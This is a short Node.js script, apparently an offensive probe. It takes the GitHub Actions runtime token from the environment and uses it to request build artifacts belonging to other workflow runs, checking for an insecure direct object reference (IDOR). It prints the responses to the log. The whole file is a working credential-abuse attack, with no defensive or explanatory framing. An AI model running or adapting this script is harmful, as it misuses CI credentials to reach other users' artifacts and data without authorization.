const https = require('https');

console.log('--- Extracting Internal Secrets via Action Context ---');
const runtimeUrl = process.env.ACTIONS_RUNTIME_URL;
const token = process.env.ACTIONS_RUNTIME_TOKEN;

console.log('Runtime URL found:', runtimeUrl ? 'yes' : 'no');
console.log('Token found:', token ? 'yes' : 'no');

if (runtimeUrl && token) {
  const idorTargets = [
    runtimeUrl + '_apis/runs/1/artifacts?api-version=6.0-preview.1',
    runtimeUrl + '_apis/runs/9999999999/artifacts?api-version=6.0-preview.1',
    runtimeUrl + '_apis/runs/100000000/artifacts?api-version=6.0-preview.1'
  ];

  console.log('--- Probing Internal APIs for IDOR ---');
  
  Promise.all(idorTargets.map(testUrl => {
    return new Promise((resolve) => {
      const parsedUrl = new URL(testUrl);
      const options = {
        hostname: parsedUrl.hostname,
        path: parsedUrl.pathname + parsedUrl.search,
        method: 'GET',
        headers: {
          'Authorization': 'Bearer ' + token,
          'Accept': 'application/json'
        }
      };

      const req = https.request(options, (res) => {
        let data = '';
        res.on('data', (chunk) => data += chunk);
        res.on('end', () => {
          console.log('\nTarget:', testUrl);
          console.log('Status:', res.statusCode);
          console.log('Response:', data.substring(0, 300));
          resolve();
        });
      });
      req.on('error', (e) => { console.error('Error:', e.message); resolve(); });
      req.end();
    });
  }));
} else {
  console.log('Failed to extract internal runtime tokens.');
}
